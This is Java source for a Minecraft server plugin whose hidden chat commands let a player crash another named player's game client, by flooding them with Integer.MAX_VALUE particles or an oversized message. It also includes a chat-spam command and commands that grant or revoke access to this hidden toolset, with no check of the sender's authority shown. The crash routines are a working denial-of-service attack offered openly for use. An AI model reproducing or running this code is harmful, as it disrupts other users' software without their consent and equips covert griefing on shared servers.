package me.improper.combatutils.commands.hiddencommands;

import me.improper.combatutils.CombatUtils;
import me.improper.combatutils.plugin.Module;
import me.improper.combatutils.plugin.Profile;
import me.improper.combatutils.plugin.ProfileLoader;
import me.improper.combatutils.server.ArgBuilder;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class ModuleCommands implements ChatCommandExecutor {

    @Override
    public boolean execute(CommandSender sender, ChatCommand command) {
        String commandName = command.getName().trim();
        String[] args = command.getArgs();

        try {
            switch (commandName) {
                case "toggle" -> {
                    if (sender instanceof Player p) {
                        Profile profile = ProfileLoader.loadProfile(p);
                        Module module = profile.getModuleObject(args[0]);
                        if (module.isEnabled()) module.onDisable();
                        else module.onEnable();
                    }
                }
                case "spam" -> {
                    if (sender instanceof Player p) {
                        int times = Integer.parseInt(args[0]);
                        String msg = ArgBuilder.buildArgs(args,1);
                        if (times > 100) sender.sendMessage(CombatUtils.starter + ChatColor.RED + "This action is over the safety limits, you might lag yourself!");
                        for (int i = 0; i < times; i ++) p.chat(msg);
                    }
                }
                case "crash" -> {
                    Player p = Bukkit.getPlayer(args[1]);
                    switch (args[0]) {
                        case "particle" -> {
                            p.spawnParticle(Particle.FLAME,p.getEyeLocation(),Integer.MAX_VALUE,0,0,0,0);
                            sender.sendMessage(CombatUtils.starter +
                                    ChatColor.GRAY + "Attempted to " +
                                    ChatColor.WHITE + "Particle " +
                                    ChatColor.GRAY + "crash " +
                                    ChatColor.WHITE + p.getName());
                        }
                        case "message" -> {
                            Bukkit.getScheduler().runTaskAsynchronously(CombatUtils.getInstance(),() -> {
                                p.sendMessage(ArgBuilder.essay);
                            });
                            sender.sendMessage(CombatUtils.starter +
                                    ChatColor.GRAY + "Attempted to " +
                                    ChatColor.WHITE + "Message " +
                                    ChatColor.GRAY + "crash " +
                                    ChatColor.WHITE + p.getName());
                        }
                    }
                }
                case "pause" -> {
                    if (sender instanceof Player p) {
                        Profile profile = ProfileLoader.loadProfile(p);
                        profile.setPaused(!profile.isPaused());
                        sender.sendMessage(CombatUtils.starter +
                                ChatColor.GRAY + "Set own profile \"paused\" to " +
                                ChatColor.WHITE + profile.isPaused());
                    }
                }
                case "help" -> {
                    String sep = ChatColor.WHITE + " | " + ChatColor.DARK_GRAY;
                    sender.sendMessage("\n" +CombatUtils.starter + ChatColor.WHITE + "Command help:" + "\n " +
                            ChatColor.YELLOW + ">help " + ChatColor.GRAY + "" + sep + "List of commands and usages\n " +
                            ChatColor.YELLOW + ">crash " + ChatColor.GRAY + "<method> <player>" + sep + "Crash a player's client\n " +
                            ChatColor.YELLOW + ">toggle " + ChatColor.GRAY + "<module>" + sep + "Toggle a profile module\n " +
                            ChatColor.YELLOW + ">spam " + ChatColor.GRAY + "<amount> [<message>]" + sep + "Spam a message x amount of times\n " +
                            ChatColor.YELLOW + ">pause " + ChatColor.GRAY + "" + sep + "Pause or resume profile ticking\n ");
                }
                case "perm" -> {
                    Player p = Bukkit.getPlayer(args[1]);
                    Profile profile = ProfileLoader.loadProfile(p);
                    switch (args[0]) {
                        case "grant" -> {
                            profile.addPermission(CombatUtils.chatCmdPerm);
                            sender.sendMessage(CombatUtils.starter + "§f" + p.getName() + " §7now has access to chat commands!");
                            p.sendMessage(CombatUtils.starter + "§7You have been granted permission to use chat commands! \"§f>help\"");
                        }
                        case "revoke" -> {
                            profile.removePermission(CombatUtils.chatCmdPerm);
                            profile.getModules().forEach(Module::onDisable);
                            sender.sendMessage(CombatUtils.starter + "§f" + p.getName() + " §7no longer has access to chat commands!");
                            p.sendMessage(CombatUtils.starter + "§7Your permission to use chat commands has been revoked!");
                        }
                    }
                }
                default -> {
                    return false;
                }
            }
            return true;
        } catch (Exception ex) {
            String msg = CombatUtils.starter + ChatColor.RED + "Command Error: ";
            if (ex instanceof NullPointerException) msg += "Command contains a null value!";
            else if (ex instanceof IndexOutOfBoundsException) msg += "Incomplete command! Please provide more information!";
            else msg += ex.getMessage();
            sender.sendMessage(msg);
            return true;
        }
    }
}
